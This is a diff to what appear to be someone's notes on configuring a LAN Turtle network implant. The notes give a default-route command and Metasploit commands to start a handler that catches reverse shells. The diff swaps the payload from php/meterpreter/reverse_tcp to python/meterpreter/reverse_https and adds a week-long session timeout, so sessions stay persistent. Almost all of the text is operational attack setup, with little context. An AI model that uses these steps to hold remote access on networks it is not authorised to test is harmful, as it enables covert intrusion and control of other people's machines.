@@ -3,7 +3,8 @@
 Network config: 
 
     /etc/config/network
-https://www.linuxquestions.org/questions/linux-networking-3/lan-turtle-configuration-4175574487/
+    
+   route add default gw X.X.X.X
 
 
 Module locations:
@@ -25,9 +26,10 @@ Setting up listener
 
     use exploit/multi/handler
 
-    set PAYLOAD php/meterpreter/reverse_tcp
+    set PAYLOAD python/meterpreter/reverse_https
 
     set LPORT/LHOST
+    set SessionExpirationTimeout 604800
     set ExitOnSession false
     exploit -j
 
